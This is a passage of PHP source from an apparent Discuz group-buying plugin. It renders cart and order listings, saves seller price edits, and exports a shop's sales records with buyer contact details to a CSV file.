			$it618_salejfid=$it618_tuan_goods['it618_jfid'];
		}
		
		if($it618_saleprice>0&&$it618_salescore>0){
			$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
			$goodspricestr='&yen;'.$it618_saleprice.' + '.$it618_salescore.' '.$goodsjfname;
			$goodspricestr1='<font color=red>&yen;</font><input type="text" style="width:68px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_price'.$it618_tuan_gwc['id'].'" value="{price}"> + <input type="text" style="width:58px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_pricescore'.$it618_tuan_gwc['id'].'" value="{score}">'.$goodsjfname;
			$goodspricestr2='&yen;{price} + {score} '.$goodsjfname;
		}else{
			if($it618_saleprice>0){
				$goodspricestr='&yen;'.$it618_saleprice;
				$goodspricestr1='<font color=red>&yen;</font><input type="text" style="width:68px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_price'.$it618_tuan_gwc['id'].'" value="{price}"><input type="hidden" id="it618_pricescore'.$it618_tuan_gwc['id'].'" value="0">';
				$goodspricestr2='&yen;{price}';
			}
			
			if($it618_salescore>0){
				$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
				$goodspricestr=$it618_salescore.' '.$goodsjfname;
				$goodspricestr1='<input type="hidden" id="it618_price'.$it618_tuan_gwc['id'].'" value="0"><input type="text" style="width:58px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_pricescore'.$it618_tuan_gwc['id'].'" value="{score}">'.$goodsjfname;
				$goodspricestr2='{score} '.$goodsjfname;
			}
		}
		
		if($it618_tuan_gwc['it618_iseditprice']==1){
			$it618_price=$it618_tuan_gwc['it618_price'];
			
			$it618_score=$it618_tuan_gwc['it618_pricescore'];
		}else{
			$it618_price=$it618_saleprice;
			$it618_score=$it618_salescore;
		}
		
		$goodspricestr1=str_replace("{price}",$it618_price,$goodspricestr1);
		$goodspricestr1=str_replace("{score}",$it618_score,$goodspricestr1);
		$goodspricestr2=str_replace("{price}",$it618_price*$it618_count,$goodspricestr2);
		$goodspricestr2=str_replace("{score}",$it618_score*$it618_count,$goodspricestr2);
		$goodspricestr2='<font color="#999">'.$it618_tuan_lang['t378'].'</font><font color="#FF7E00">'.$goodspricestr2.'</font> ';
		
		if($_GET['ac1']=='pcgwc'){
			$salepricestr=$it618_tuan_lang['s1795'].$goodspricestr.'<br>'.$it618_tuan_lang['s1797'].$goodspricestr1.' <input type="button" style="border:none;background-color:#390;color:#fff;padding:3px 10px;padding-bottom:4px;cursor:pointer" value="'.it618_tuan_getlang('s885').'" onclick="save_editprice('.$it618_tuan_gwc['id'].')" />';
		}else{
			$salepricestr='<br>'.$it618_tuan_lang['s1795'].$goodspricestr.'<br>'.$it618_tuan_lang['s1797'].$goodspricestr1.' <input type="button" style="border:none;background-color:#390;color:#fff;padding:3px 10px;padding-bottom:4px;cursor:pointer" value="'.it618_tuan_getlang('s885').'" onclick="save_editprice('.$it618_tuan_gwc['id'].')" />';
		}
		
		$it618_saleprice=$it618_price;
		$it618_salescore=$it618_score;
		
		$yunfeistr='';$yunfeimoney=0;$yunfeiscore=0;
		if($it618_tuan_gwc['it618_kdid']>0){
			$it618_tuan_kdyunfei=C::t('#it618_tuan#it618_tuan_kdyunfei')->fetch_by_id($it618_tuan_gwc['it618_kdid']);
			if($it618_count>$it618_tuan_kdyunfei['it618_firstcount']){
				$yunfeimoney=$it618_tuan_kdyunfei['it618_firstprice']+$it618_tuan_kdyunfei['it618_price']*($it618_count-$it618_tuan_kdyunfei['it618_firstcount']);
				$yunfeiscore=$it618_tuan_kdyunfei['it618_firstscore']+$it618_tuan_kdyunfei['it618_score']*($it618_count-$it618_tuan_kdyunfei['it618_firstcount']);
				$yunfeijfid=$it618_tuan_kdyunfei['it618_jfid'];
			}else{
				$yunfeimoney=$it618_tuan_kdyunfei['it618_firstprice'];
				$yunfeiscore=$it618_tuan_kdyunfei['it618_firstscore'];
				$yunfeijfid=$it618_tuan_kdyunfei['it618_jfid'];
			}
			
			if($yunfeimoney>0&&$yunfeiscore>0){
				$yunfeijfname=$_G['setting']['extcredits'][$yunfeijfid]['title'];
				$yunfeistr='&yen;'.$yunfeimoney.'+'.$yunfeiscore.$yunfeijfname;
			}else{
				if($yunfeimoney>0){
					$yunfeistr='&yen;'.$yunfeimoney;
				}
				
				if($yunfeiscore>0){
					$yunfeijfname=$_G['setting']['extcredits'][$yunfeijfid]['title'];
					$yunfeistr=$yunfeiscore.$yunfeijfname;
				}
			}
			
			$yunfeistr='<font color="#999">'.$it618_tuan_lang['s798'].'</font><font color="#FF7E00">'.$yunfeistr.'</font>';
		}
		
		$summoney=$it618_saleprice*$it618_count+$yunfeimoney;
		$allsummoney=$allsummoney+$summoney;
		
		if($it618_salescore>0){
			$allsumscore[$it618_salejfid]+=$it618_salescore*$it618_count;
		}
		
		if($yunfeiscore>0){
			$allsumscore[$yunfeijfid]+=$yunfeiscore;
		}
		
		$jfblstr='';
		if($it618_tuan_goods['it618_jfbl']>0){
			$zsmoney=intval($it618_tuan_goods['it618_jfbl']*$summoney/100);
			if($zsmoney>=1){
				$jfblstr='<font color=#888>'.$it618_tuan_lang['s1110'].'<font color=red>'.intval($it618_tuan_goods['it618_jfbl']*$summoney/100).'</font>'.$creditname.'</font>';
				$allzsmoney=$allzsmoney+$zsmoney;
			}
		}
		
		$disabled='';
		$onclickstr='onclick="gwcminus('.$it618_tuan_gwc['id'].')"';
		if($it618_tuan_gwc['it618_count']==1){
			$disabled='disabled';
			$onclickstr='';
		}

		if($_GET['ac1']=='pcgwc'){
			$tmpurl=it618_tuan_getrewrite('tuan_product',$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:product&pid='.$it618_tuan_goods['id']);

			$goodslist.='<tr><td>
							<a href="'.$tmpurl.'" target="_blank">
							<div style="float:left;width:69px">
							<img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" width="65"/></a>
							</div>
							<div style="float:left;width:460px">
							<a href="'.$tmpurl.'" target="_blank" title="'.$it618_tuan_goods['it618_name'].'" style="font-size:13px">'.$it618_tuan_goods['it618_name'].'</a><br>
							<font color=#666>'.$it618_tuan_shop['it618_name'].'</font> '.$gtypename.' '.$thdstr.'<br>
							<p>'.$saletypestr.' '.$paytypestr.' '.$jfblstr.'</p>
							<p>'.$goodspricestr2.$yunfeistr.'</p>
							</div>
							</td>
							<td style="color:#999">
							'.$salepricestr.'
							</td><td>
							'.$it618_tuan_gwc['it618_count'].'
							</td></tr>';
		}
		
		if($_GET['ac1']=='wapgwc'){
			$tmpurl=it618_tuan_getrewrite('tuan_wap','product@'.$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:wap&pagetype=product&cid='.$it618_tuan_goods['id']);
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			
			$goodslist.='<tr id="gwcpid'.$it618_tuan_gwc['id'].'" class="cart-list cl"><td><table width="100%">
							<tr class="gwclisttr1">
							<td width="69" style="padding-left:3px">
							<a class="product-img" href="'.$tmpurl.'" target="_blank">
							<img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" width="65" height="65"/></a>
							</td>
							<td colspan="3">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_tuan_goods['it618_name'].'" style="font-size:13px">'.$it618_tuan_goods['it618_name'].'</a><br>
							<font color=#999>'.$it618_tuan_lang['s531'].'</font><font color=red>'.$it618_tuan_gwc['it618_count'].'</font> '.$gtypename.' '.$thdstr.'<br>
							<p>'.$saletypestr.' '.$paytypestr.' '.$jfblstr.'</p>
							<p>'.$goodspricestr2.$yunfeistr.'</p>
							</td></tr>
							<tr><td colspan="4" style="height:6px"></td></tr>
							<tr class="gwclisttr2"><td colspan="4" style="color:#999;text-align:right;border-top:#f1f1f1 1px solid">
							'.$salepricestr.'
							</td></tr>
						</table></td></tr>';
			
		}

	}
	
	if($allzsmoney>0){
		$jfmoenystr.=$it618_tuan_lang['s1113'].'<font color=red>'.$allzsmoney.'</font>'.$creditname;
	}
	
	for($i=1;$i<=8;$i++){
		if($allsumscore[$i]>0){
			$jfname=$_G['setting']['extcredits'][$i]['title'];
			$scorestr.=$allsumscore[$i].$jfname.'+';
		}
	}
	
	if($scorestr!=''){
		$scorestr.='@';
		$scorestr=str_replace("+@","",$scorestr);
	}
	
	if($allsummoney>0&&$scorestr!=''){
		$summoneystr.='&yen;'.$allsummoney.'+'.$scorestr;
	}else{
		if($allsummoney>0){
			$summoneystr.='&yen;'.$allsummoney;
		}
		if($scorestr!=''){
			$summoneystr.=$scorestr;
		}
	}
	
	C::t('#it618_tuan#it618_tuan_gwc')->update_state_by_uid_shopid(1,$gwcuid,$ShopId);
	
	if($_GET['ac1']=='pcgwc'){
		$editbtn='<tr><td colspan="4"><input type="button" class="btn" value="'.it618_tuan_getlang('s1796').'" onclick="state_editprice()" /></td></tr>';
		echo $goodslist.'<tr><td colspan="4"><span style="float:right">'.it618_tuan_getusername($gwcuid).' '.$it618_tuan_lang['s1074'].'<b><font color=red>'.$summoneystr.'</font></b></span><span style="float:left">'.$jfmoenystr.'</span></td></tr>'.$editbtn;
	}else{
		$editbtn='<tr><td colspan="4"><input type="button" class="it618btn" style="width:100%;height:36px" value="'.it618_tuan_getlang('s1796').'" onclick="state_editprice()" /></td></tr>';
		echo $goodslist.'<tr><td align="right" style="padding:6px;padding-right:10px;padding-bottom:0;line-height:15px;color:#999">'.$jfmoenystr.'</td></tr><tr><td align="right" style="padding:10px">'.it618_tuan_getusername($gwcuid).' '.$it618_tuan_lang['s1074'].' <b><font color="#FF6600" style="font-size:18px">'.$summoneystr.'</font></b></td></tr>'.$editbtn;
	}
	exit;
}


if($_GET['ac']=="save_editprice"){
	$it618_tuan_gwc=C::t('#it618_tuan#it618_tuan_gwc')->fetch_by_id($_GET['gid']);
	if($it618_tuan_gwc['it618_shopid']!=$ShopId){
		echo it618_tuan_getlang('s513');exit;
	}
		
	C::t('#it618_tuan#it618_tuan_gwc')->update($_GET['gid'],array(
		'it618_price' => $_GET['price'],
		'it618_pricescore' => $_GET['score'],
		'it618_iseditprice' => 1
	));
	exit;
}


if($_GET['ac']=="state_editprice"){
	$gwcuid=intval($_GET['gwcuid']);
	C::t('#it618_tuan#it618_tuan_gwc')->update_state_by_uid_shopid(0,$gwcuid,$ShopId);
	
	echo it618_tuan_getlang('s1798');
	exit;
}


if($_GET['ac']=="sale_dao"){
	if($_GET['state']) {
		if($_GET['state']==1)$it618sql .= "and s.it618_state = 1";
		if($_GET['state']==2)$it618sql .= "and s.it618_state = 2";
		if($_GET['state']==3)$it618sql .= "and s.it618_state = 3";
		if($_GET['state']==4)$it618sql .= "and s.it618_state = 4";
		if($_GET['state']==5)$it618sql .= "and s.it618_state = 5";
	}
	
	if($_GET['saletype']) {
		if($_GET['saletype']==1)$it618sql .= " and s.it618_saletype = 1";
		if($_GET['saletype']==2)$it618sql .= " and s.it618_saletype = 2";
		if($_GET['saletype']==3)$it618sql .= " and s.it618_saletype = 3";
	}
	
	$strtmp=$it618_tuan_lang['s1104']."\n";
	foreach(C::t('#it618_tuan#it618_tuan_sale')->fetch_all_by_search(
		$ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'s.it618_uid,s.id desc',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],0,0
	) as $it618_tuan_sale) {
		$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_sale['it618_pid']);
		
		$gtypename='';
		if($it618_tuan_sale['it618_gtypeid']>0){
			$gtypename = C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_sale['it618_gtypeid']);
		}
		
		$it618_gthdname='';
		if($it618_tuan_sale['it618_gthdid']>0){
			$it618_tuan_shop_thd = C::t('#it618_tuan#it618_tuan_shop_thd')->fetch_by_id($it618_tuan_sale['it618_gthdid']);
			$it618_gthdname=$it618_tuan_shop_thd['it618_name'];
		}
		
		$it618_saletype='';
		if($it618_tuan_sale['it618_saletype']==1){
			$it618_saletype=it618_tuan_getlang('s1099');
		}elseif($it618_tuan_sale['it618_saletype']==2){
			$it618_saletype=it618_tuan_getlang('s1100');
		}else{
			$it618_saletype=it618_tuan_getlang('s1101');
		}
		
		if($it618_tuan_sale['it618_gwcid']>0){
			$it618_saletype.=' '.$it618_tuan_lang['t187'].':'.$it618_tuan_sale['it618_gwcid'];
		}
		
		$it618_kddan='';
		if($it618_tuan_sale['it618_kdid']>0){
			$it618_tuan_kd=C::t('#it618_tuan#it618_tuan_kd')->fetch_by_id($it618_tuan_sale['it618_kdid']);
			$it618_kddan=it618_tuan_getlang('s775').$it618_tuan_kd['it618_name'].' '.$it618_tuan_sale['it618_kddan'];
		}
		
		$strtmp.=$it618_tuan_goods['it618_name'].",".$gtypename.",".$it618_tuan_sale['it618_count'].",".$it618_saletype.",".$it618_gthdname.",".it618_tuan_getusername($it618_tuan_sale['it618_uid'])." ".$it618_tuan_sale['it618_name']." ".$it618_tuan_sale['it618_tel']." ".$it618_tuan_sale['it618_addr']." ".$it618_tuan_sale['it618_bz']." ".$it618_kddan.",".date('Y-m-d H:i:s', $it618_tuan_sale['it618_time']).",".$it618_tuan_sale['it618_salebz']."\n";
		$datacount=$datacount+1;
	}
	
	$datapath1=DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/data/shop'.$ShopId.'/';
	if(!file_exists($datapath1)) {
		mkdir($datapath1);
	}
	$datapath=DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/data/shop'.$ShopId.'/dao/';
	if(!file_exists($datapath)) {
		mkdir($datapath);
	}
	
	if($_GET['it618_time1']!=''||$_GET['it618_time2']!=''){
		if($_GET['it618_time1']!=''){
			$timetmp1=str_replace("-","",$_GET['it618_time1']);
		}else{
			$timetmp1='null';
		}
		if($_GET['it618_time2']!=''){
			$timetmp2=str_replace("-","",$_GET['it618_time2']);
		}else{
			$timetmp2='null';
		}
		$timetmp=$timetmp1.'-'.$timetmp2;
	}
	$timestr=md5(date("YmdHis").FORMHASH).'_'.$timetmp. '_' . $datacount;
	it618_tuan_delfile($datapath);
	
	@$fp = fopen($datapath.$timestr.'.csv',"w");
	if(!$fp){
		echo "system error";
		exit();
	}else {
		fwrite($fp,$strtmp);
		fclose($fp);
	}
	
	echo $_G['siteurl'].'source/plugin/it618_tuan/kindeditor/data/shop'.$ShopId.'/dao/'.$timestr.'.csv';
	exit;
}


if($_GET['ac']=="sale_get"){
	$time=$_G['timestamp']-3600*24*$it618_tuan['tuan_autodatecount'];
	foreach(C::t('#it618_tuan#it618_tuan_sale')->fetch_all_by_search(0,"s.it618_tel!='' and s.it618_time<".$time." and s.it618_state=1 and s.it618_kddan!='' and s.it618_saletype=2 and (s.it618_state_tuihuo=0 or s.it618_state_tuihuo=3)") as $it618_tuan_sale) {
		it618_tuan_qrxf($it618_tuan_sale['id']);
	}
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	if($_GET['state']) {
		if($_GET['state']==1)$it618sql .= "and s.it618_state = 1";
		if($_GET['state']==2)$it618sql .= "and s.it618_state = 2";
		if($_GET['state']==3)$it618sql .= "and s.it618_state = 3";
		if($_GET['state']==4)$it618sql .= "and s.it618_state = 4";
		if($_GET['state']==5)$it618sql .= "and s.it618_state = 5";
	}
	
	if($_GET['saletype']) {
		if($_GET['saletype']==1)$it618sql .= " and s.it618_saletype = 1";
		if($_GET['saletype']==2)$it618sql .= " and s.it618_saletype = 2";
		if($_GET['saletype']==3)$it618sql .= " and s.it618_saletype = 3";
	}
	
	$ppp = 12;
	$th='<tr><th>'.it618_tuan_getlang('s265').'</th><th>'.it618_tuan_getlang('s266').'</th><th>'.it618_tuan_getlang('s267').'</th><th>'.it618_tuan_getlang('s268').'</th><th>'.it618_tuan_getlang('s269').'</th><th>'.it618_tuan_getlang('s270').'</th><th>'.it618_tuan_getlang('s272').'</th><th>'.it618_tuan_getlang('s273').'</th></tr>';
	
	$count = C::t('#it618_tuan#it618_tuan_sale')->count_by_search($ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	$summoney = C::t('#it618_tuan#it618_tuan_sale')->sum_money_by_search($ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	$sumtcmoney = C::t('#it618_tuan#it618_tuan_sale')->sum_tcmoney_by_search($ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$salesum= '<td colspan=15>'.it618_tuan_getlang('s229').'<font color=red>'.$count.'</font> '.it618_tuan_getlang('s230').'<font color=red>'.$summoney.'</font> '.it618_tuan_getlang('s415').'<font color=red>'.$sumtcmoney.'</font><span style="float:right">'.it618_tuan_getlang('s416').'</span></td>';
	
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_tuan:ajax");
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='getsalelist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='getsalelist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','getsalelist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
	
	$tmp.='<option value="0">'.it618_tuan_getlang('s698').'</option>';
	foreach(C::t('#it618_tuan#it618_tuan_kd')->fetch_all_by_search() as $it618_tuan_kd) {
		$tmp.='<option value='.$it618_tuan_kd['id'].'>'.$it618_tuan_kd['it618_name'].'</option>';
	}
			
	foreach(C::t('#it618_tuan#it618_tuan_sale')->fetch_all_by_search(
		$ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'s.id desc',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp
	) as $it618_tuan_sale) {
		
		$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_sale['it618_pid']);
		
		$it618_isservice='';
		if($it618_tuan_sale['it618_isservice1']==1)$it618_isservice.=it618_tuan_getlang('s107').' ';
		if($it618_tuan_sale['it618_isservice2']==1)$it618_isservice.=it618_tuan_getlang('s108').' ';
		if($it618_tuan_sale['it618_isservice3']==1)$it618_isservice.=it618_tuan_getlang('s109').' ';
		if($it618_isservice!='')$it618_isservice='<br>'.$it618_isservice;
		
		if($it618_tuan_sale['it618_state']==1)$it618_state='<font color=red>'.it618_tuan_getlang('s191').'</font>';
		if($it618_tuan_sale['it618_state']==2)$it618_state='<font color=blue>'.it618_tuan_getlang('s192').'</font>';
		if($it618_tuan_sale['it618_state']==3)$it618_state='<font color=#390>'.it618_tuan_getlang('s193').'</font>';
		if($it618_tuan_sale['it618_state']==4)$it618_state='<font color=#F0F>'.it618_tuan_getlang('s194').'</font>';
		if($it618_tuan_sale['it618_state']==5)$it618_state='<font color=purple>'.it618_tuan_getlang('s195').'</font>';
		
		$jftmp='';$jfstr='';
		
		if($_GET['ac1']=='pcmysale')$jfstr='<br>'; else $jfstr='';
		if($jfmoney>0)$jfstr.=it618_tuan_getlang('s672').'<font color="#390">'.$jfmoney.'</font>'.it618_tuan_getlang('s653');
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		if($it618_tuan_sale['it618_jfbl']>0&&$it618_tuan_sale['it618_state']==3){
			$it618_jfbl=intval($it618_tuan_sale['it618_jfbl']*$it618_tuan_sale['it618_price']*$it618_tuan_sale['it618_count']/100);
			$jftmp.=it618_tuan_getlang('s1053').$it618_jfbl.$creditname.'\n\n';
		}
		if($it618_tuan_sale['it618_salejl']>0)$jftmp.=it618_tuan_getlang('s673').$it618_tuan_sale['it618_salejl'].$creditname.it618_tuan_getlang('s674').'\n\n';
		if($it618_tuan_sale['it618_pjjl']>0)$jftmp.=it618_tuan_getlang('s675').$it618_tuan_sale['it618_pjjl'].$creditname.it618_tuan_getlang('s674').'\n\n';
		
		if($jftmp!='')$jfstr='<br><a href="javascript:" class="saleabtn" onclick="alert(\''.$jftmp.'\')">'.$it618_tuan_lang['s1785'].'</a>';
		
		$saletime='';
		if($it618_tuan_sale['it618_saletype']==1){
			if($it618_tuan_sale['it618_state']==1&&$it618_tuan_sale['it618_esaletime']!=''){
				$it618_esaletime=strtotime($it618_tuan_sale['it618_esaletime'].':00');
				if($_G['timestamp']>$it618_esaletime){
					$it618_state.='<br>'.it618_tuan_getlang('s242').' <font color=red>'.intval(($_G['timestamp']-$it618_esaletime)/3600/24).'</font>'.it618_tuan_getlang('s243');
					$timecolor='#ccc';
				}else{
					$it618_bsaletime=strtotime($it618_tuan_sale['it618_bsaletime'].':00');
					if($_G['timestamp']<$it618_bsaletime){
						$timecolor='blue';
					}else{
						$timecolor='#390';
					}
				}
			}
		}
		
		$bz='';$strcontent='';
		if($it618_tuan_sale['it618_bz']!=""){
			$bz=' <a href="javascript:" id="bz'.$it618_tuan_sale[id].'">'.it618_tuan_getlang('s869').'</a> ';
			$strcontent.='<strong>'.it618_tuan_getlang('s783').'</strong><br>'.$it618_tuan_sale['it618_bz'].'<br><br>';
		}
		
		$bzbtn='';$tuistrcontent='';$kdbtn='1';$it618_kddan='';
		if($it618_tuan_sale['it618_saletype']==2){
			$it618_tuan_kd=C::t('#it618_tuan#it618_tuan_kd')->fetch_by_id($it618_tuan_sale['it618_kdid']);
			if($it618_tuan_sale['it618_kddan']!='')$it618_kddan='<span title="'.$it618_tuan_sale['it618_bz'].'" style="color:#390">'.$it618_tuan_kd['it618_name'].' '.$it618_tuan_sale['it618_kddan'].'</span>';
			
			if($it618_tuan_sale['it618_state']==1){
				if($it618_tuan_sale['it618_kddan']==''){
					if($it618_tuan_sale['it618_state_tuihuo']!=1){
						$it618_state.='<br><a href="javascript:" id="fahuo'.$it618_tuan_sale[id].'">'.it618_tuan_getlang('s784').'</a>';
						$kdbtnname=it618_tuan_getlang('s785');
					}
				}else{
					$it618_state.='<br>'.$it618_tuan_lang['t326'];
					$kdbtnname=it618_tuan_getlang('s786');
					$it618_kddan.=' <a href="javascript:" id="fahuo'.$it618_tuan_sale[id].'">'.$kdbtnname.'</a>';
				}
				
				if($it618_tuan_sale['it618_state_tuihuo']==1){
					$tuistrcontent=$it618_tuan_sale['it618_content_tuihuo'];
					$it618_state.='<br>'.it618_tuan_getlang('s790').' <a href="javascript:" id="tui'.$it618_tuan_sale[id].'">'.it618_tuan_getlang('s788').'</a><br><a href="javascript:" class="saleabtn" onclick="tongyitui('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s789').'</a> <a href="javascript:" class="saleabtn" onclick="jujuetui('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s791').'</a>';
				}
				if($it618_tuan_sale['it618_state_tuihuo']==2){
					$it618_state.='<br>'.it618_tuan_getlang('s789');
				}
				if($it618_tuan_sale['it618_state_tuihuo']==3){
					$it618_state.='<br>'.it618_tuan_getlang('s791');
				}
			}else{
				$kdbtnname=it618_tuan_getlang('s787');
				$it618_kddan.=' <a href="javascript:" id="fahuo'.$it618_tuan_sale[id].'">'.$kdbtnname.'</a>';
				$kdbtn='';
			}
			
			if($kdbtn!='')$kdbtn='<input type="button" class="it618btn" value="'.$kdbtnname.'" onclick="savekd()">';
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;

			$tmp1=str_replace("<option value=".$it618_tuan_kd['id'],"<option value=".$it618_tuan_kd['id']." selected=selected",$tmp);
			
			$strcontent.='<div class="kd_fahuo">'.$it618_tuan_sale['it618_name'].' '.$it618_tuan_sale['it618_addr'].' '.$it618_tuan_sale['it618_tel'].'<br><br>'.it618_tuan_getlang('s699').'<select id="it618_kdid">'.$tmp1.'</select><input type="text" id="it618_kddan" value="'.$it618_tuan_sale['it618_kddan'].'"><input type="hidden" id="saleid" value="'.$it618_tuan_sale['id'].'"> '.$kdbtn.' <span style="color:red" id="kdtips"></span><br><br><font color=red>'.it618_tuan_getlang('s793').'</font></div>';
		}
		
		if($it618_tuan_sale['it618_saletype']==3){
			$it618_kddan='<a href="javascript:" class="saleabtn" onclick="setsalekm('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s865').'</a>';
		}
		
		$strtel='';
		if($it618_tuan_sale['it618_tel']!=""){
			$strtel=it618_tuan_getlang('s701').$it618_tuan_sale['it618_tel'];
		}
		
		if($it618_kddan!='')$it618_kddan='<br>'.$it618_kddan;
		$strtmp=$strtel.$bz.$it618_kddan;
		
		$it618_tc='';
		if($it618_tuan_sale['it618_tcbl']>0){
			$it618_tc=$it618_tuan_sale['it618_tcbl'].'% ';
			$it618_tc.=' <font color=red>'.$it618_tuan_sale['it618_tc'].'</font>'.$it618_tuan_lang['s125'].' ';
			
			if($it618_tuan_sale['it618_score']>0){
				$tmptc=intval($it618_tuan_sale['it618_tcbl']*$it618_tuan_sale['it618_score']*$it618_tuan_sale['it618_count']/100);
				$jfname=$_G['setting']['extcredits'][$it618_tuan_sale['it618_jfid']]['title'];
				$it618_tc.='<font color=red>'.$tmptc.'</font>'.$jfname;
			}
			
			$it618_tc=$it618_tuan_lang['s1890'].$it618_tc;
		}
		
		$it618_tuitc='';
		if($it618_tuan_sale['it618_tuitcbl']>0){
			$it618_tuitc=$it618_tuan_sale['it618_tuitcbl'].'% ';
			$it618_tuitc.='<font color=red>'.$it618_tuan_sale['it618_tc'].'</font>'.$it618_tuan_lang['s125'].' ';
			
			if($it618_tuan_sale['it618_score']>0){
				$tmptc=intval($it618_tuan_sale['it618_tuitcbl']*$it618_tuan_sale['it618_score']*$it618_tuan_sale['it618_count']/100);
				$jfname=$_G['setting']['extcredits'][$it618_tuan_sale['it618_jfid']]['title'];
				$it618_tuitc.='<font color=red>'.$tmptc.'</font>'.$jfname;
			}
			
			$it618_tuitc='<br>'.$it618_tuan_lang['s1891'].$it618_tuitc;
		}
		
		if($it618_tuan_sale['it618_saletype']==1){
			$it618_yxtime='<font color="'.$timecolor.'">'.$it618_tuan_sale['it618_bsaletime'].'<br>'.$it618_tuan_sale['it618_esaletime'].'</font><br>';
			$it618_saletype=it618_tuan_getlang('s1099');
		}elseif($it618_tuan_sale['it618_saletype']==2){
			$it618_yxtime='';
			$it618_isservice='';
			$it618_saletype=it618_tuan_getlang('s1100');
		}else{
			$it618_yxtime='';
			$it618_isservice='';
			$it618_saletype=it618_tuan_getlang('s1101');
		}
		
		$it618_salebz='';
		if($it618_tuan_sale['it618_saletype']==2){
			if($it618_tuan_sale['it618_salebz']!=''){
				$it618_salebz='(<font color="red">'.strlen($it618_tuan_sale['it618_salebz']).'</font>'.$it618_tuan_lang['s1782'].')';
			}
			$it618_salebz='<br><a href="javascript:" class="saleabtn" onclick="setsalebz('.$it618_tuan_sale[id].')"> '.$it618_tuan_lang['s1777'].$it618_salebz.'</a>';
		}
		
		if($it618_tuan_sale['it618_gwcid']>0){
			$it618_saletype.=' '.$it618_tuan_lang['t187'].':<font color="#FF3300"><b>'.$it618_tuan_sale['it618_gwcid'].'</b></font>';
		}
		
		$jftmp='';
		if($it618_tuan_sale['it618_jfbl']>0&&$it618_tuan_sale['it618_state']==3){
			$it618_jfbl=intval($it618_tuan_sale['it618_jfbl']*$it618_tuan_sale['it618_price']*$it618_tuan_sale['it618_count']/100);
			$jftmp='<br>'.it618_tuan_getlang('s1054').'<font color=red>'.$it618_jfbl.'</font>'.$creditname;
		}
		
		$gtypename='';
		if($it618_tuan_sale['it618_gtypeid']>0){
			$gtypename = C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_sale['it618_gtypeid']);
			$gtypename=' [<font color=red>'.$gtypename.'</font>]';
		}
		
		$it618_gthdidstr='';
		if($it618_tuan_sale['it618_gthdid']>0){
			$it618_tuan_shop_thd = C::t('#it618_tuan#it618_tuan_shop_thd')->fetch_by_id($it618_tuan_sale['it618_gthdid']);
			$it618_gthdidstr=' [<a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tuan_shop_thd['it618_name'].' '.$it618_tuan_shop_thd['it618_addr'].' '.$it618_tuan_shop_thd['it618_dianhua'].'\')"><font color=red>'.$it618_tuan_lang['t342'].'</font></a>]';
		}
		
		$tmpurl=it618_tuan_getrewrite('tuan_product',$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:product&pid='.$it618_tuan_goods['id']);
		$sale_get.='<tr class="hover">
		<td><input class="checkbox" type="checkbox" id="chk_del'.$it618_tuan_sale[id].'" name="delete[]" value="'.$it618_tuan_sale[id].'" '.$disabled.'><label for="chk_del'.$it618_tuan_sale[id].'">'.$it618_tuan_sale['id'].'</label></td>
		<td width="300"><a href="'.$tmpurl.'" target="_blank">'.$it618_tuan_goods['it618_name'].'</a>'.$it618_tuan_goods['it618_mealname'].'<br>'.it618_tuan_getlang('s796').$it618_tuan_sale['it618_count'].' '.$gtypename.'</td>
		<td>'.it618_tuan_getsalemoney($it618_tuan_sale,'<br>').'</td>
		<td>'.$it618_saletype.$it618_gthdidstr.'<font color=#390>'.$it618_isservice.'</font>'.$jftmp.$jfstr.'</td>
		<td>'.$it618_state.'</td>
